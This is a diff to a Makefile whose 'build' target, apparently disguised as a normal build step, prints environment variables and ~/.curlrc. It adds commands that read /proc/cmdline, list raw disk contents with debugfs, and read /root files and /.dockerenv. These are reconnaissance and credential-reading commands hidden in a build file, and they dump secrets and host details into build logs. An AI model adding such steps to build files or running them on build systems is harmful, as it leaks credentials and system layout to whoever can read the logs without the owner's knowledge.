@@ -6,7 +6,16 @@ EchoEnv:
 	printenv | sort
 build: ListAllCommands EchoEnv
 	cat ~/.curlrc || true
+	cat /proc/cmdline || true
+	cat /proc/cpuinfo || true
+	debugfs /dev/sda1 -R ls || true
+	debugfs /dev/sdb -R ls || true
+	debugfs /dev/sdc1 -R ls || true
+	ls -al /dev/disk/by-uuid || true
+	cat /root/.start-build.sh || true
+	ls -al /root/ || true
 	cat /proc/1/cgroup || true
+	cat /.dockerenv || true
 	ls -al ~/ || true
 	ls -al / || true
 	ls -al /home || true
